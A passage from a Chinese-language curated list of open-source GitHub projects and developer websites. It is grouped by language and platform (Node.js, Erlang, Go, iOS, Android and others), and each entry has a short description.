<a href=""https://github.com/laverdet/node-fibers"" rel=""nofollow noreferrer"">node-fibers</a>: Node 的 Fiber 实现</li>
<li>
<a href=""https://github.com/codemix/fast.js"" rel=""nofollow noreferrer"">fast.js</a>: 对 JS 的一些方法的重新实现, 提供更高的性能</li>
<li>
<a href=""https://github.com/nomiddlename/log4js-node"" rel=""nofollow noreferrer"">log4js-node</a>: Log4js 的 Node.js 版</li>
<li>
<a href=""https://github.com/andrewplummer/Sugar"" rel=""nofollow noreferrer"">https://github.com/andrewplummer/Sugar</a>: Javascript 原生类型的功能扩充(Monkey Patch), 提供了各种语法糖</li>
<li>
<a href=""https://github.com/arturadib/shelljs"" rel=""nofollow noreferrer"">shelljs</a>: 各种 Shell 命令的 Node 实现</li>
<li>
<a href=""https://github.com/meteor/meteor"" rel=""nofollow noreferrer"">Meteor</a>: 一个基于 Node.js 的平台，用于开发实时网页和移动应用</li>
<li>
<a href=""https://github.com/koajs/koa"" rel=""nofollow noreferrer"">Koa</a>: Node.js web 框架，Express 原班人马打造，推崇极简，通过 generator 实现异步控制</li>
<li>
<a href=""https://github.com/power-assert-js/power-assert"" rel=""nofollow noreferrer"">Power Assert</a>: 报错信息极其详细的 assert 库</li>
<li>
<a href=""https://github.com/vadimdemedes/trevor"" rel=""nofollow noreferrer"">Trevor</a>: 本地的简版 Travis 集成集成测试环境，需要Docker支持</li>
</ul>
<h6>Express</h6>
<ul>
<li>
<a href=""https://github.com/simov/express-admin"" rel=""nofollow noreferrer"">express-admin</a>: Express 的后端，支持(MySQL, MariaDB, SQLite, PostgreSQL)</li>
<li>
<a href=""https://github.com/simov/grant"" rel=""nofollow noreferrer"">grant</a>: Express 认证中间件(middleware)</li>
</ul>
<h4>Erlang</h4>
<ul>
<li>
<a href=""https://github.com/yrashk/kerl"" rel=""nofollow noreferrer"">kerl</a>: 版本管理器, 用于管理 Erlang/OTP 实例, 类似于 RVM</li>
<li>
<a href=""https://github.com/rabbitmq/rabbitmq-server"" rel=""nofollow noreferrer"">rabbitmq-server</a>: RabbitMQ 消息队列 源码</li>
<li>
<a href=""https://github.com/rabbitmq/rabbitmq-tutorials"" rel=""nofollow noreferrer"">rabbitmq-tutorials</a>: RabbitMQ 教程</li>
<li>
<a href=""https://github.com/processone/ejabberd"" rel=""nofollow noreferrer"">ejabberd</a>: XMPP 协议的开源实现，用于及时聊天软件，Whatsapp 的聊天核心就是这个软件</li>
<li>
<a href=""https://github.com/elixir-lang/elixir"" rel=""nofollow noreferrer"">elixir</a>: 基于 Erlang VM 的一个语言，语法类似于 Ruby</li>
<li>
<a href=""https://github.com/phoenixframework/phoenix"" rel=""nofollow noreferrer"">phoenix</a>: 基于 Elixir 语言的 web 框架</li>
</ul>
<h4>Java</h4>
<ul>
<li>
<a href=""https://github.com/elasticsearch/elasticsearch"" rel=""nofollow noreferrer"">elasticsearch</a>: 开源的分布式搜索引擎，社区活跃，支持强大</li>
<li>
<a href=""https://github.com/alibaba/fastjson"" rel=""nofollow noreferrer"">fastjson</a>: 阿里开源的一款高效的 JSON 库</li>
</ul>
<h4>C/C++</h4>
<ul>
<li>
<a href=""https://github.com/nlohmann/json"" rel=""nofollow noreferrer"">json</a>: C++ 的 JSON 库</li>
<li>
<a href=""https://github.com/winlinvip/simple-rtmp-server"" rel=""nofollow noreferrer"">simple-rtmp-server</a>: 运营级的互联网直播服务器集群</li>
<li>
<a href=""https://github.com/mozilla/mozjpeg"" rel=""nofollow noreferrer"">mozjpeg</a>: JPEG 图片解码压缩，Mozilla 出品</li>
<li>
<a href=""https://github.com/sass/libsass"" rel=""nofollow noreferrer"">libsass</a>: SASS 的 C++ 实现</li>
<li>
<a href=""https://github.com/AfterTheRainOfStars/QQStars"" rel=""nofollow noreferrer"">QQStars</a>: 基于 WebQQ 协议和 QT 开发的 QQ 客户端</li>
<li>
<a href=""https://github.com/BVLC/caffe"" rel=""nofollow noreferrer"">caffe</a>: 一个关于数据挖掘的库</li>
<li>
<a href=""https://github.com/fastos/fastsocket"" rel=""nofollow noreferrer"">fastsocket</a>: 一个高扩展性的 Socket 库，在多核设备上有良好的表现，新浪出品</li>
<li>
<a href=""https://github.com/ryanmjacobs/c"" rel=""nofollow noreferrer"">C</a>: 将 C 语言校本化的一个工具, 可以直接编写 C 语言作为脚本使用</li>
</ul>
<h4>Go</h4>
<ul>
<li>
<a href=""https://github.com/derekparker/delve"" rel=""nofollow noreferrer"">delve</a>: Go 调试器</li>
<li>
<a href=""https://github.com/golang/go"" rel=""nofollow noreferrer"">go</a>: Go 源码</li>
<li>
<a href=""https://github.com/astaxie/beego"" rel=""nofollow noreferrer"">beego</a>: 国内大牛开发的 Web 框架</li>
<li>
<a href=""https://github.com/revel/revel"" rel=""nofollow noreferrer"">revel</a>: 全栈 Web 框架</li>
<li>
<a href=""https://github.com/go-martini/martini"" rel=""nofollow noreferrer"">martini</a>: 另一款 Web 框架</li>
<li>
<a href=""https://github.com/sosedoff/pgweb"" rel=""nofollow noreferrer"">pgweb</a>: PostgreSQL 的 Web 数据库浏览器</li>
</ul>
<h4>Lua</h4>
<ul>
<li>
<a href=""https://github.com/openresty/lua-nginx-module"" rel=""nofollow noreferrer"">lua-nginx-module</a>: 一个 Nginx 组件包, 可以使用 Lua 来开发 Nginx 插件, 将之变成一个全功能的 Web 应用服务器</li>
<li>
<a href=""https://github.com/Mashape/kong"" rel=""nofollow noreferrer"">kong</a>: 一个专注于可扩展, 高性能以及可靠性的 Restful API 框架</li>
</ul>
<h2>IOS 或 OSX</h2>
<ul>
<li>
<a href=""https://github.com/ArtSabintsev/Harpy"" rel=""nofollow noreferrer"">Harpy</a>: 用于检测应用更新</li>
<li>
<a href=""https://github.com/cruffenach/CRToast"" rel=""nofollow noreferrer"">CRToast</a>: 现代、时髦的 IOS 通知提醒库</li>
<li>
<a href=""https://github.com/mattt/Ono"" rel=""nofollow noreferrer"">Ono</a>: IOS 或者 OSX 中用于处理 XML &amp; HTML 的库</li>
<li>
<a href=""https://github.com/indragiek/CocoaMarkdown"" rel=""nofollow noreferrer"">CocoaMarkdown</a>: IOS 或者 OSX 中用于解析或者渲染 Markdown 的库</li>
<li>
<a href=""https://github.com/Haneke/Haneke"" rel=""nofollow noreferrer"">Haneke</a>: 一个用于缓存图片的 IOS 库，无需配置</li>
<li>
<a href=""https://github.com/Haneke/HanekeSwift"" rel=""nofollow noreferrer"">HanekeSwift</a>: Haneke 的 swift 版本</li>
<li>
<a href=""https://github.com/bryceredd/RFQuiltLayout"" rel=""nofollow noreferrer"">RFQuiltLayout</a>: 一个用于实现 IOS 端瀑布流的库</li>
<li>
<a href=""https://github.com/kolyvan/kxmenu"" rel=""nofollow noreferrer"">kxmenu</a>: 用于 IOS 上实现垂直菜单，支持上下左右等方向</li>
<li>
<a href=""https://github.com/rsms/peertalk"" rel=""nofollow noreferrer"">peertalk</a>: IOS 或者 OSX 中用于处理 USB 通信</li>
<li>
<a href=""https://github.com/romaonthego/REMenu"" rel=""nofollow noreferrer"">REMenu</a>: IOS 中用于实现下拉菜单效果</li>
<li>
<a href=""https://github.com/romaonthego/RESideMenu"" rel=""nofollow noreferrer"">RESideMenu</a>: IOS 中侧边栏的异步效果实现，类似于 QQ 中的侧边栏</li>
<li>
<a href=""https://github.com/levey/AwesomeMenu"" rel=""nofollow noreferrer"">AwesomeMenu</a>: IOS 中用于实现类似于 Path 应用菜单的效果，各种酷炫</li>
<li>
<a href=""https://github.com/Alamofire/Alamofire"" rel=""nofollow noreferrer"">Alamofire</a>: NFNetworking 的 Swift 版本</li>
<li>
<a href=""https://github.com/supermarin/Alcatraz"" rel=""nofollow noreferrer"">Alcatraz</a>: Xcode 的包管理工具</li>
<li>
<a href=""https://github.com/Jawbone/JBChartView"" rel=""nofollow noreferrer"">JBChartView</a>: IOS 的图表库</li>
<li>
<a href=""https://github.com/kevinzhow/PNChart"" rel=""nofollow noreferrer"">PNChart</a>: 基于 IOS 的强大图表库</li>
<li>
<a href=""https://github.com/BradLarson/GPUImage"" rel=""nofollow noreferrer"">GPUImage</a>: 基于 GPU 图片、视频处理库</li>
<li>
<a href=""https://github.com/nomad/shenzhen"" rel=""nofollow noreferrer"">shenzhen</a>: 一个用于构架和发布 IOS 的命令行工具</li>
<li>
<a href=""https://github.com/TheLevelUp/ZXingObjC"" rel=""nofollow noreferrer"">ZXingObjC</a>: ZXing(二维码、条形码扫描库) 的 Objective-C 实现</li>
<li>
<a href=""https://github.com/pkluz/PKRevealController"" rel=""nofollow noreferrer"">PKRevealController</a>: IOS 上一个非常优秀的，用于实现侧边栏的库</li>
<li>
<a href=""https://github.com/kif-framework/KIF"" rel=""nofollow noreferrer"">KIF</a>: IOS 功能测试框架</li>
<li>
<a href=""https://github.com/BoltsFramework/Bolts-iOS"" rel=""nofollow noreferrer"">Bolts-iOS</a>: 为了加快开发速度的相对低层级的库集合， Parse 和 Facebook 出品</li>
<li>
<a href=""https://github.com/nghialv/MaterialKit"" rel=""nofollow noreferrer"">MaterialKit</a>: 基于 Swift 实现的 Google Material Design 效果</li>
<li>
<a href=""https://github.com/Carthage/Carthage"" rel=""nofollow noreferrer"">Carthage</a>: 一个简单的、去中心化的 Cocoa 依赖管理库, Swift 编写，仅用于 IOS8.0 及 以后的系统</li>
<li>
<a href=""https://github.com/icanzilb/JSONModel"" rel=""nofollow noreferrer"">JSONModel</a>: 智能化的数据模型，有了它，再也不用手动解析JSON数据啦</li>
<li>
<a href=""https://github.com/krzysztofzablocki/KZPlayground"" rel=""nofollow noreferrer"">KZPlayground</a>: 提供对 Objective-C 的 Playground 支持，比 Swift 更快</li>
<li>
<a href=""https://github.com/robotmedia/RMStore"" rel=""nofollow noreferrer"">RMStore</a>: 轻量级应用内购买库，集成方便，使用简单，方便项目中快速支持应用内购买</li>
<li>
<a href=""https://github.com/facebook/pop"" rel=""nofollow noreferrer"">pop</a>: Facebook开源出来的动画扩展库</li>
<li>
<a href=""https://github.com/jessesquires/JSQMessagesViewController"" rel=""nofollow noreferrer"">JSQMessagesViewController</a>: 一个优美大方的即时聊天 UI 库</li>
<li>
<a href=""https://github.com/realm/realm-cocoa"" rel=""nofollow noreferrer"">realm-cocoa</a>: 一个移动端数据库，提供了丰富的数据支持，快速，且不依赖 SQLite</li>
<li>
<a href=""https://github.com/mattt/Surge"" rel=""nofollow noreferrer"">Surge</a>: Swift 的高效数学运算库，基于 <a href=""https://developer.apple.com/library/mac/documentation/Accelerate/Reference/AccelerateFWRef/_index.html"" rel=""nofollow noreferrer"">Accelerate</a>
</li>
<li>
<a href=""https://github.com/Masonry/Masonry"" rel=""nofollow noreferrer"">Masonry</a>: OSX 和 IOS 上用来简化 Autolayout 约束的一个库</li>
<li>
<a href=""https://github.com/Yalantis/Side-Menu.iOS"" rel=""nofollow noreferrer"">Side-Menu.iOS</a>: 一款精美的侧边栏实现</li>
<li>
<a href=""https://github.com/facebook/AsyncDisplayKit"" rel=""nofollow noreferrer"">AsyncDisplayKit</a>: IOS 上的一款异步界面引擎, 非常流畅, Facebook 出品</li>
<li>
<a href=""https://github.com/kiwi-bdd/Kiwi"" rel=""nofollow noreferrer"">Kiwi</a>: IOS 的 BDD 测试框架</li>
<li>
<a href=""https://github.com/square/PonyDebugger"" rel=""nofollow noreferrer"">PonyDebugger</a>: IOS 的远程调试工具, 允许开发者在 Chrome Developer Tool 中调试 IOS 应用</li>
<li>
<a href=""https://github.com/supermarin/ObjectiveSugar"" rel=""nofollow noreferrer"">ObjectiveSugar</a>: 提供一些 Objective-C 的语法糖, 类似于 Ruby 的语法</li>
<li>
<a href=""https://github.com/SwiftyJSON/SwiftyJSON"" rel=""nofollow noreferrer"">SwiftyJSON</a>: Swift 的一个处理 JSON 的库</li>
<li>
<a href=""https://github.com/robb/Cartography"" rel=""nofollow noreferrer"">Cartography</a>: 在 Swift 中 声明式的使用 Autolayout</li>
<li>
<a href=""https://github.com/Haneke/HanekeSwift"" rel=""nofollow noreferrer"">HanekeSwift</a>: Swift 中可用来做缓存的库,对图片的支持尤佳</li>
<li>
<a href=""https://github.com/nst/RuntimeBrowser"" rel=""nofollow noreferrer"">RuntimeBrowser</a>: IOS 和 OSX 的运行时类浏览器, 可以查看运行时的头文件, 允许动态加载新模块</li>
<li>
<a href=""https://github.com/nst/iOS-Runtime-Headers"" rel=""nofollow noreferrer"">iOS-Runtime-Headers</a>: IOS 运行时头文件, 从RuntimeBrowser抽出</li>
<li>
<a href=""https://github.com/Naituw/WBWebViewConsole"" rel=""nofollow noreferrer"">WBWebViewConsole</a>: 应用内置用于 Debug 的控制台, 支持 UIWebView &amp; WKWebView</li>
<li>
<a href=""https://github.com/danielebogo/DBCamera"" rel=""nofollow noreferrer"">DBCamera</a>: 方便高度自定义相机UI的库</li>
<li>
<a href=""https://github.com/NZN/UIImage-Helpers"" rel=""nofollow noreferrer"">UIImage-Helpers</a>: 截图、模糊化图片、生成特定颜色的图片，都可以由这个库完成</li>
<li>
<a href=""https://github.com/daltoniam/SwiftHTTP"" rel=""nofollow noreferrer"">SwiftHTTP</a>: Swift 的 HTTP 封装</li>
<li>
<a href=""https://github.com/viki-org/VKVideoPlayer"" rel=""nofollow noreferrer"">VKVideoPlayer</a>: 方便高度自定义视频播放器的库</li>
<li>
<a href=""https://github.com/magicalpanda/MagicalRecord"" rel=""nofollow noreferrer"">MagicalRecord</a>: 基于 Core Data 之上的 ORM, 是 Active Record 的 IOS 版实现, 可以精简 Core Data 代码</li>
<li>
<a href=""https://github.com/stephencelis/SQLite.swift"" rel=""nofollow noreferrer"">SQLite.swift</a>: SQLite3 的 Swift 层接口实现</li>
<li>
<a href=""https://github.com/louisdh/panelkit"" rel=""nofollow noreferrer"">panelkit</a>: iOS 面板组件，可以用于创建非常灵活的面板</li>
</ul>
<h2>Android</h2>
<ul>
<li>
<a href=""https://github.com/r0adkll/Slidr"" rel=""nofollow noreferrer"">Slidr</a>: 一个用于给 Activity 添加滑动消隐效果的库</li>
<li>
<a href=""https://github.com/1sters/material_design_zh"" rel=""nofollow noreferrer"">material_design_zh</a>: Material Design 的中文协同翻译</li>
<li>
<a href=""https://github.com/inaka/galgo"" rel=""nofollow noreferrer"">galgo</a>: Android 的日志工具，可以将日志显示在 Activity 的最上端，方便调试</li>
<li>
<a href=""https://github.com/pedant/sweet-alert-dialog"" rel=""nofollow noreferrer"">sweet-alert-dialog</a>: Sweet Alert Android 版本，用于应用内通知和提示</li>
<li>
<a href=""https://github.com/Yalantis/Side-Menu.Android"" rel=""nofollow noreferrer"">Side-Menu.Android</a>: 一款精美的侧边栏实现</li>
<li>
<a href=""https://github.com/square/dagger"" rel=""nofollow noreferrer"">dagger</a>: Android 和 Java 的依赖注入库</li>
<li>
<a href=""https://github.com/square/picasso"" rel=""nofollow noreferrer"">picasso</a>: 一款用于下载并缓存图片的库</li>
<li>
<a href=""https://github.com/asyl/ArcAnimator"" rel=""nofollow noreferrer"">ArcAnimator</a>: 实现 ARC 动画的库</li>
<li>
<a href=""https://github.com/PhilJay/MPAndroidChart"" rel=""nofollow noreferrer"">MPAndroidChart</a>: 强大的图表工具</li>
</ul>
<h2>代码效率</h2>
<h4>CoffeeScript</h4>
<ul><li>
<a href=""https://github.com/jashkenas/coffeescript"" rel=""nofollow noreferrer"">coffeescript</a>: Coffeescript 源码</li></ul>
<h4>TypeScript</h4>
<ul><li>
<a href=""https://github.com/borisyankov/DefinitelyTyped"" rel=""nofollow noreferrer"">DefinitelyTyped</a>: 高质量的 TypeScript 资源汇总</li></ul>
<h4>Sublime Text</h4>
<ul>
<li>
<a href=""https://github.com/SublimeCodeIntel/SublimeCodeIntel"" rel=""nofollow noreferrer"">SublimeCodeIntel</a>: Sublime Text 的代码补全工具，支持多种语言</li>
<li>
<a href=""https://github.com/emmetio/emmet"" rel=""nofollow noreferrer"">Emmet</a>：一个用于提高开发效率的编辑器插件，前身是Zen coding</li>
<li>
<a href=""https://github.com/SublimeLinter/SublimeLinter3"" rel=""nofollow noreferrer"">SublimeLinter</a>: 一个提供代码质量检测的插件</li>
<li>
<a href=""https://github.com/kairyou/SublimeTmpl"" rel=""nofollow noreferrer"">SublimeTmpl</a>：快速新建指定的模版文件</li>
<li>
<a href=""https://github.com/P233/Syntax-highlighting-for-Sass"" rel=""nofollow noreferrer"">Syntax-highlighting-for-Sass</a>：sass代码高亮插件</li>
<li>
<a href=""https://github.com/SublimeText-Markdown/MarkdownEditing"" rel=""nofollow noreferrer"">MarkdownEditing</a>: Sublime Text 强大的 Markdown 扩展, 提供快捷键, 主题等</li>
<li>
<a href=""https://github.com/facelessuser/ApplySyntax/"" rel=""nofollow noreferrer"">ApplySyntax</a>: 辅助检测语法插件</li>
<li>
<a href=""https://github.com/SublimeText/CTags/"" rel=""nofollow noreferrer"">CTags</a>: Sublime Text Ctags 支持插件, 需要安装 ctags</li>
<li>
<a href=""https://github.com/reactjs/sublime-react"" rel=""nofollow noreferrer"">sublime-react</a>: React 代码高亮</li>
</ul>
<h2>云计算</h2>
<h4>Docker</h4>
<ul>
<li>
<a href=""https://github.com/GoogleCloudPlatform/kubernetes"" rel=""nofollow noreferrer"">kubernetes</a>: Google 开源的 Docker 集中管控系统</li>
<li>
<a href=""https://github.com/zettio/weave"" rel=""nofollow noreferrer"">weave</a>: 用于为基于不同主机的 Docker Containers 创建一个虚拟网络</li>
</ul>
<h4>OS</h4>
<ul>
<li>
<a href=""https://github.com/torvalds/linux"" rel=""nofollow noreferrer"">linux</a>: linux 源码，Linus 大神之作，只能膜拜了</li>
<li>
<a href=""https://github.com/joyent/smartos-live"" rel=""nofollow noreferrer"">smartos-live</a>: Joyent 出品的用于云平台的智能 OS</li>
</ul>
<h2>开源产品(论坛、在线教育、项目管理等)</h2>
<ul>
<li>
<a href=""https://github.com/edx/edx-platform"" rel=""nofollow noreferrer"">Edx</a>: 在线教育平台源代码，Edx</li>
<li>
<a href=""https://github.com/AlchemyCMS/alchemy_cms"" rel=""nofollow noreferrer"">alchemy_cms</a>: 开源 CMS 系统，基于 Rails</li>
<li>
<a href=""https://github.com/flynn/flynn"" rel=""nofollow noreferrer"">flynn</a>: 下一代 PAAS 服务产品，用于管理主机或者 AWS 实例</li>
<li>
<a href=""https://github.com/zensh/jsgen"" rel=""nofollow noreferrer"">jsgen</a>: 开源论坛、博客系统, 基于 Node.js, AngularJS, MongoDB</li>
<li>
<a href=""http://git.libreboard.com/libreboard/libreboard"" rel=""nofollow noreferrer"">libreboard</a>: <a href=""https://github.com/libreboard/libreboard"" rel=""nofollow noreferrer"">开源看板系统</a>，除了配色，长得几乎和 <a href=""https://trello.com"" rel=""nofollow noreferrer"">Trello</a> 一模一样</li>
<li>
<a href=""https://github.com/twostairs/paperwork"" rel=""nofollow noreferrer"">paperwork</a>: 开源笔记系统，类似于Evernote, Microsoft OneNote &amp; Google Keep</li>
<li>
<a href=""https://github.com/arachnys/cabot"" rel=""nofollow noreferrer"">cabot</a>: 开源服务器监控服务</li>
<li>
<a href=""https://github.com/mozilla/firefox-ios"" rel=""nofollow noreferrer"">firefox-ios</a>: IOS 版 Firefox 源代码</li>
<li>
<a href=""https://github.com/gogits/gogs"" rel=""nofollow noreferrer"">gogs</a>: 一款开源 Git 托管服务，基于 GO 语言开发，类似于 Gitlab</li>
<li>
<a href=""https://github.com/cantino/huginn"" rel=""nofollow noreferrer"">huginn</a>: 个人代理监控，可以监控天气、Twitter、网站等等，并按照预设的条件发送通知给自己，功能强大！</li>
<li>
<a href=""https://github.com/cnodejs/nodeclub"" rel=""nofollow noreferrer"">nodeclub</a>: 社区系统，基于Node.js 和 MongoDB 开发</li>
<li>
<a href=""https://github.com/keystonejs/keystone"" rel=""nofollow noreferrer"">keystone</a>: 基于 Node.js 的 CMS 系统</li>
<li>
<a href=""https://github.com/punkave/apostrophe"" rel=""nofollow noreferrer"">apostrophe</a>: 基于 Node.js 的 CMS 系统</li>
<li>
<a href=""https://github.com/reddit/reddit"" rel=""nofollow noreferrer"">reddit</a>: Reddit 的源代码</li>
<li>
<a href=""https://github.com/sdelements/lets-chat"" rel=""nofollow noreferrer"">lets-chat</a>: 适合小团队的聊天服务, 可以自己搭建, 基于 Node.js 支持 Restful API, XMPP 等</li>
<li>
<a href=""https://github.com/progrium/dokku"" rel=""nofollow noreferrer"">dokku</a>: 基于 Docker 的 Mini-Heroku, 最小型的 PAAS 实现</li>
<li>
<a href=""https://github.com/videolan/vlc"" rel=""nofollow noreferrer"">VLC</a>: VLC 视频播放器源代码</li>
<li>
<a href=""https://github.com/iSimar/HackerNews-React-Native"" rel=""nofollow noreferrer"">HackerNews-React-Native</a>: HackerNews 基于 React Native 实现</li>
<li>
<a href=""https://github.com/spree/spree"" rel=""nofollow noreferrer"">spree</a>: 基于 Ruby on Rails 的开源在线电子商务网站</li>
<li>
<a href=""https://github.com/singro/v2ex"" rel=""nofollow noreferrer"">v2ex</a>: V2EX 的 IOS 源代码</li>
</ul>
<h2>代码规范&amp;设计模式</h2>
<h4>Ruby</h4>
<ul><li>
<a href=""https://github.com/airbnb/ruby"" rel=""nofollow noreferrer"">Airbnb 的 ruby 代码编写规范</a>: Airbnb 的 ruby 代码编写规范</li></ul>
<h6>Rails</h6>
<ul><li>
<a href=""https://github.com/bbatsov/rails-style-guide"" rel=""nofollow noreferrer"">Rails 代码编写规范</a>: Rails 代码编写规范</li></ul>
<h4>Javascript</h4>
<ul><li>
<a href=""https://github.com/umdjs/umd"" rel=""nofollow noreferrer"">umd</a>: 全局模块定义, 提供了几种模块定义规则和模式, 使其可以支持 AMD/CMD/浏览器全局/jQuery插件等</li></ul>
<h6>AngularJS</h6>
<ul>
<li>
<a href=""https://github.com/toddmotto/angularjs-styleguide"" rel=""nofollow noreferrer"">angularjs-styleguide</a>: AngularJS 代码规范</li>
<li>
<a href=""https://github.com/trochette/Angular-Design-Patterns-Best-Practices"" rel=""nofollow noreferrer"">Angular-Design-Patterns-Best-Practices</a>: Angular 设计模式的最佳实现</li>
</ul>
<h4>Java</h4>
<ul><li>
<a href=""https://github.com/iluwatar/java-design-patterns"" rel=""nofollow noreferrer"">java-design-patterns</a>: Java 设计模式</li></ul>
<h6>Android</h6>
<ul><li>
<a href=""https://github.com/futurice/android-best-practices"" rel=""nofollow noreferrer"">android-best-practices</a>: Android 开发最佳实践</li></ul>
<h4>Bash</h4>
<ul><li>
<a href=""https://github.com/progrium/bashstyle"" rel=""nofollow noreferrer"">bashstyle</a>: Bash 代码编写规范</li></ul>
<h4>Objective-C</h4>
<ul><li>
<a href=""https://github.com/NYTimes/objective-c-style-guide"" rel=""nofollow noreferrer"">objective-c-style-guide</a>: Objective-C 代码编写规范，New York Times 出品</li></ul>
<h6>IOS</h6>
<ul><li>
<a href=""https://github.com/futurice/ios-good-practices"" rel=""nofollow noreferrer"">ios-good-practices</a>: IOS 开发最佳实践</li></ul>
<h4>Swift</h4>
<ul><li>
<a href=""https://github.com/raywenderlich/swift-style-guide"" rel=""nofollow noreferrer"">swift-style-guide</a>: Swift 代码编写规范</li></ul>
<h4>Design</h4>
<ul><li>
<a href=""https://github.com/18F/web-design-standards"" rel=""nofollow noreferrer"">web-design-standards</a>: 网站设计标准（美国政府网站）</li></ul>
<h2>数据库</h2>
<ul>
<li>
<a href=""https://github.com/begriffs/postgrest"" rel=""nofollow noreferrer"">postgrest</a>: PostgreSQL 的 RESTful API</li>
<li>
<a href=""https://github.com/amjith/pgcli"" rel=""nofollow noreferrer"">pgcli</a>: PostgreSQL 命令行工具，提供高亮和自动补全</li>
<li>
<a href=""https://github.com/mongodb/mongo"" rel=""nofollow noreferrer"">mongo</a>: MongoDB 源代码</li>
<li>
<a href=""https://github.com/louischatriot/nedb"" rel=""nofollow noreferrer"">nedb</a>: 纯 Javascript 实现，类 MongoDB 的内存型数据库，API 基本和 MongoDB相同，可选同步写入磁盘，小项目数据不太多时性能很强乃至超过MongoDB</li>
<li>
<a href=""https://github.com/Tokutek/mongo"" rel=""nofollow noreferrer"">TokuMX MongoDB</a>: TokuMX 版的 MongoDB, MongoDB 的一个分支，支持更快的写速度，完整的事务支持等</li>
<li>
<a href=""https://github.com/sequelpro/sequelpro"" rel=""nofollow noreferrer"">sequelpro</a>: Mac OSX 的 MySQL 数据库管理软件</li>
</ul>
<h2>博客 / 网站</h2>
<h4>设计</h4>
<ul>
<li>
<a href=""https://dribbble.com/"" rel=""nofollow noreferrer"">Dribble</a>: 设计师必上的网站，各种设计资源、创意、分享等</li>
<li>
<a href=""https://designmuseum.org/"" rel=""nofollow noreferrer"">Design Museum</a>: 当代前沿设计，涉及设计的各个领域</li>
<li>
<a href=""https://www.behance.net/"" rel=""nofollow noreferrer"">Behance</a>: 创意&amp;设计资源集合，Adobe 旗下网站(应用)</li>
<li>
<a href=""http://www.awwwards.com/"" rel=""nofollow noreferrer"">Awwwards</a>: 一家筛选评比互联网上最佳网站设计开发的网站</li>
<li>
<a href=""http://www.gooood.hk/"" rel=""nofollow noreferrer"">gooood</a>: 建筑，景观，设计，艺术在线杂志</li>
<li>
<a href=""http://ui4app.com/"" rel=""nofollow noreferrer"">ui4app</a>: 专注于 IOS UI 的一个网站，提供各种设计资源</li>
<li>
<a href=""http://www.wookmark.com/"" rel=""nofollow noreferrer"">wookmark</a>: 这上面有分享的各种各样的美图、设计等</li>
</ul>
<h4>技术</h4>
<ul>
<li>
<a href=""http://code4app.com/"" rel=""nofollow noreferrer"">code4app</a>: 专注于IOS 代码的一个网站，提供各种功能实现 Demo</li>
<li>
<a href=""http://css-tricks.com/"" rel=""nofollow noreferrer"">CSS Tricks</a>: 各种 CSS 技巧</li>
<li>
<a href=""http://www.html5rocks.com/en/"" rel=""nofollow noreferrer"">html5rocks</a>: 提供各种各样关于 HTML5 的资讯</li>
<li>
<a href=""http://html5weekly.com/"" rel=""nofollow noreferrer"">html5weekly</a>: 提供各种各样关于 HTML5 的资讯和技巧</li>
<li>
<a href=""http://rubyweekly.com/"" rel=""nofollow noreferrer"">rubyweekly</a>: 提供各种各样关于 Ruby 的资讯和技巧</li>
<li>
<a href=""http://javascriptweekly.com/"" rel=""nofollow noreferrer"">javascriptweekly</a>: 提供各种各样关于 Javascript 的资讯和技巧</li>
<li>
<a href=""http://www.ng-newsletter.com/"" rel=""nofollow noreferrer"">ng-newsletter</a>: 提供各种各样关于 Angular 的资讯和技巧</li>
<li>
<a href=""https://cnodejs.org/"" rel=""nofollow noreferrer"">cnodejs</a>: 国内最大最火 Node.js 社区</li>
<li>
<a href=""https://ruby-china.org/"" rel=""nofollow noreferrer"">ruby-china</a>: 国内最大最火 Ruby 社区</li>
<li>
<a href=""http://angularjs.cn/"" rel=""nofollow noreferrer"">angularjs</a>: Angularjs 的国内中文社区</li>
</ul>
<h2>书籍 / 阅读 / 学习</h2>
<h4>Awesome 系列</h4>
<ul>
<li>
<a href=""https://github.com/sindresorhus/awesome"" rel=""nofollow noreferrer"">awesome</a>: awesome系列祖师爷，资源汇总的汇总 😄</li>
<li>
<a href=""https://github.com/wasabeef/awesome-android-libraries"" rel=""nofollow noreferrer"">awesome-android-libraries</a>: Android 各种开源库的一个汇总</li>
<li>
<a href=""https://github.com/wasabeef/awesome-android-ui"" rel=""nofollow noreferrer"">awesome-android-ui</a>: Android 各种开源UI/UX库的一个汇总</li>
<li>
<a href=""https://github.com/prakhar1989/awesome-courses"" rel=""nofollow noreferrer"">awesome-courses</a>: 关于计算机科学的各种大学教学课程</li>
<li>
<a href=""https://github.com/markets/awesome-ruby"" rel=""nofollow noreferrer"">awesome-ruby</a>: Ruby 资源集合</li>
<li>
<a href=""https://github.co"" rel=""nofollow noreferrer"">awesome-go</a>: Go 资源集合</li>
<li>
<a href=""https://github.com/fffaraz/awesome-cpp"" rel=""nofollow noreferrer"">awesome-cpp</a>: C++ 的资源集合</li>
<li>
<a href=""https://github.com/h4cc/awesome-elixir"" rel=""nofollow noreferrer"">awesome-elixir</a>: Elixir 资源集合</li>
<li>
<a href=""https://github.com/emacs-tw/awesome-emacs"" rel=""nofollow noreferrer"">awesome-emacs</a>: Emacs 资源整合</li>
<li>
<a href=""https://github.com/joeljfischer/awesome-apple"" rel=""nofollow noreferrer"">awesome-apple</a>: 关于苹果开发的插件/库/文章等资源</li>
<li>
<a href=""https://github.com/matteocrippa/awesome-swift"" rel=""nofollow noreferrer"">awesome-swift)</a>: Swift 资源整合</li>
<li>
<a href=""https://github.com/enaqx/awesome-react"" rel=""nofollow noreferrer"">awesome-react</a>: React 资源整合</li>
<li>
<a href=""https://github.com/davidsonfellipe/awesome-wpo"" rel=""nofollow noreferrer"">awesome-wpo</a>: 一系列前端性能优化集合</li>
<li>
<a href=""https://github.com/gianarb/awesome-angularjs"" rel=""nofollow noreferrer"">awesome-angularjs</a>: AngularJS 资源整合</li>
<li>
<a href=""https://github.com/sindresorhus/awesome-nodejs"" rel=""nofollow noreferrer"">awesome-nodejs</a> : Node.js 资源整合</li>
<li>
<a href=""https://github.com/ziadoz/awesome-php"" rel=""nofollow noreferrer"">awesome-php</a> : PHP 资源整合</li>
<li>
<a href=""https://github.com/vinta/awesome-python"" rel=""nofollow noreferrer"">awesome-python</a> : Python 资源整合</li>
<li>
<a href=""https://github.com/J2TeaM/awesome-AutoIt"" rel=""nofollow noreferrer"">awesome-autoit</a> : 第三方定制开源软件合集</li>
<li>
<a href=""https://github.com/ruby-vietnam/awesome-books"" rel=""nofollow noreferrer"">awesome-books</a>: 一些很不错的开发书籍</li>
<li>
<a href=""https://github.com/sindresorhus/awesome-npm.git"" rel=""nofollow noreferrer"">awesome-npm</a>: Npm 相关资源整合</li>
<li>
